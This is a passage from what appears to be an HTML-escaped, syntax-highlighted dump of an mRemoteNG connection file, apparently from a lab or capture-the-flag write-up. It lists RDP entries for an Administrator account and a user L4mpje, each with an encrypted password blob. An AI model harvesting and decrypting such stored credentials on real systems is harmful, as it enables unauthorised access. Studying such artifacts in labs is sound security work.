+M&quot;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;KdfIterations&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;1000&quot;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;FullFileEncryption&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;false&quot;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;Protected&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;ZSvKI7j224Gf/twXpaP5G2QFZMLr1iO1f5JKdtIKL6eUg+eWkL5tKO886au0ofFPW0 
+oop8R8ddXKAx4KK7sAk6AA&quot;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;ConfVersion&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;2.6&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;                                                                                       
+    &amp;lt;Node &lt;span class=&quot;nv&quot;&gt;Name&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;DC&quot;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;Type&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;Connection&quot;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;Descr&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&quot;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;Icon&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;mRemoteNG&quot;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;Panel&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;General&quot;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;Id&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;500e7d58-662a-44d4-aff0-3a4f547a3fee&quot;&lt;/span&gt; Userna 
+&lt;span class=&quot;nv&quot;&gt;me&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;Administrator&quot;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;Domain&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&quot;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;Password&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;aEWNFV5uGcjUHF0uS17QTdT9kVqtKCPeoC0Nw5dmaPFjNQ2kt/zO5xDqE4HdVmHAowVRdC7emf7lWWA10dQKiw==&quot;&lt;/span&gt; 
+ &lt;span class=&quot;nv&quot;&gt;Hostname&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;127.0.0.1&quot;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;Protocol&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;RDP&quot;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;PuttySession&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;Default Settings&quot;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;Port&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;3389&quot;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;ConnectToConsole&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;false&quot;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;UseCredSsp&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;true&quot;&lt;/span&gt; Rend 
+&lt;span class=&quot;nv&quot;&gt;eringEngine&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;IE&quot;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;ICAEncryptionStrength&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;EncrBasic&quot;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;RDPAuthenticationLevel&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;NoAuth&quot;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;RDPMinutesToIdleTimeout&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;0&quot;&lt;/span&gt; RDPAlertIdleTimeo 
+&lt;span class=&quot;nv&quot;&gt;ut&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;false&quot;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;LoadBalanceInfo&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&quot;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;Colors&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;Colors16Bit&quot;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;Resolution&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;FitToWindow&quot;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;AutomaticResize&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;true&quot;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;DisplayWallpaper&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;false&quot;&lt;/span&gt; Disp 
+&lt;span class=&quot;nv&quot;&gt;layThemes&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;false&quot;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;EnableFontSmoothing&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;false&quot;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;EnableDesktopComposition&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;false&quot;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;CacheBitmaps&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;false&quot;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;RedirectDiskDrives&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;false&quot;&lt;/span&gt; R 
+&lt;span class=&quot;nv&quot;&gt;edirectPorts&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;false&quot;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;RedirectPrinters&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;false&quot;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;RedirectSmartCards&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;false&quot;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;RedirectSound&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;DoNotPlay&quot;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;SoundQuality&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;Dynamic&quot;&lt;/span&gt; Redire 
+&lt;span class=&quot;nv&quot;&gt;ctKeys&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;false&quot;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;Connected&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;false&quot;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;PreExtApp&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&quot;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;PostExtApp&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&quot;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;MacAddress&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&quot;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;UserField&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&quot;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;ExtApp&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&quot;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;VNCCompression&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;CompNone&quot;&lt;/span&gt; VNCEn 
+&lt;span class=&quot;nv&quot;&gt;coding&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;EncHextile&quot;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;VNCAuthMode&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;AuthVNC&quot;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;VNCProxyType&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;ProxyNone&quot;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;VNCProxyIP&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&quot;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;VNCProxyPort&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;0&quot;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;VNCProxyUsername&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&quot;&lt;/span&gt; VNCProxyPa 
+&lt;span class=&quot;nv&quot;&gt;ssword&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&quot;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;VNCColors&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;ColNormal&quot;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;VNCSmartSizeMode&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;SmartSAspect&quot;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;VNCViewOnly&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;false&quot;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;RDGatewayUsageMethod&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;Never&quot;&lt;/span&gt; RDGatewayHostna 
+&lt;span class=&quot;nv&quot;&gt;me&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&quot;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;RDGatewayUseConnectionCredentials&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;Yes&quot;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;RDGatewayUsername&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&quot;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;RDGatewayPassword&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&quot;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;RDGatewayDomain&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&quot;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;InheritCacheBitmaps&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot; 
+false&quot;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;InheritColors&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;false&quot;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;InheritDescription&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;false&quot;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;InheritDisplayThemes&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;false&quot;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;InheritDisplayWallpaper&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;false&quot;&lt;/span&gt; InheritEnab 
+&lt;span class=&quot;nv&quot;&gt;leFontSmoothing&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;false&quot;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;InheritEnableDesktopComposition&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;false&quot;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;InheritDomain&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;false&quot;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;InheritIcon&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;false&quot;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;InheritPanel&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;false&quot;&lt;/span&gt; I 
+&lt;span class=&quot;nv&quot;&gt;nheritPassword&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;false&quot;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;InheritPort&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;false&quot;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;InheritProtocol&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;false&quot;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;InheritPuttySession&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;false&quot;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;InheritRedirectDiskDrives&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;false&quot;&lt;/span&gt; 
+ &lt;span class=&quot;nv&quot;&gt;InheritRedirectKeys&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;false&quot;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;InheritRedirectPorts&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;false&quot;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;InheritRedirectPrinters&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;false&quot;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;InheritRedirectSmartCards&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;false&quot;&lt;/span&gt; Inhe 
+&lt;span class=&quot;nv&quot;&gt;ritRedirectSound&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;false&quot;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;InheritSoundQuality&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;false&quot;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;InheritResolution&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;false&quot;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;InheritAutomaticResize&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;false&quot;&lt;/span&gt; InheritUseConsoleS 
+&lt;span class=&quot;nv&quot;&gt;ession&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;false&quot;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;InheritUseCredSsp&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;false&quot;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;InheritRenderingEngine&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;false&quot;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;InheritUsername&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;false&quot;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;InheritICAEncryptionStrength&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;fa 
+lse&quot;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;InheritRDPAuthenticationLevel&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;false&quot;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;InheritRDPMinutesToIdleTimeout&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;false&quot;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;InheritRDPAlertIdleTimeout&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;false&quot;&lt;/span&gt; InheritLoad 
+&lt;span class=&quot;nv&quot;&gt;BalanceInfo&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;false&quot;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;InheritPreExtApp&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;false&quot;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;InheritPostExtApp&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;false&quot;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;InheritMacAddress&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;false&quot;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;InheritUserField&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;false&quot;&lt;/span&gt; Inheri 
+&lt;span class=&quot;nv&quot;&gt;tExtApp&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;false&quot;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;InheritVNCCompression&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;false&quot;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;InheritVNCEncoding&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;false&quot;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;InheritVNCAuthMode&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;false&quot;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;InheritVNCProxyType&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;false&quot;&lt;/span&gt;  
+&lt;span class=&quot;nv&quot;&gt;InheritVNCProxyIP&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;false&quot;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;InheritVNCProxyPort&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;false&quot;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;InheritVNCProxyUsername&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;false&quot;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;InheritVNCProxyPassword&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;false&quot;&lt;/span&gt; InheritVNC 
+&lt;span class=&quot;nv&quot;&gt;Colors&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;false&quot;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;InheritVNCSmartSizeMode&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;false&quot;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;InheritVNCViewOnly&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;false&quot;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;InheritRDGatewayUsageMethod&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;false&quot;&lt;/span&gt; InheritRDGatewayHo 
+&lt;span class=&quot;nv&quot;&gt;stname&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;false&quot;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;InheritRDGatewayUseConnectionCredentials&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;false&quot;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;InheritRDGatewayUsername&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;false&quot;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;InheritRDGatewayPassword&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;false 
+&quot;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;InheritRDGatewayDomain&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;false&quot;&lt;/span&gt; /&amp;gt;
+    &amp;lt;Node &lt;span class=&quot;nv&quot;&gt;Name&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;L4mpje-PC&quot;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;Type&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;Connection&quot;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;Descr&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&quot;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;Icon&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;mRemoteNG&quot;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;Panel&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;General&quot;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;Id&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;8d3579b2-e68e-48c1-8f0f-9ee1347c9128&quot;&lt;/span&gt;
+ &lt;span class=&quot;nv&quot;&gt;Username&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;L4mpje&quot;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;Domain&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&quot;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;Password&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;yhgmiu5bbuamU3qMUKc/uYDdmbMrJZ/JvR1kYe4Bhiu8bXybLxVnO0U9fKRylI7NcB9QuRsZVvla8esB&quot;&lt;/span&gt; Hostnam
+&lt;span class=&quot;nv&quot;&gt;e&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;192.168.1.75&quot;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;Protocol&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;RDP&quot;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;PuttySession&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;Default Settings&quot;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;Port&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;3389&quot;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;ConnectToConsole&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;false&quot;&lt;/span&gt; &lt;span 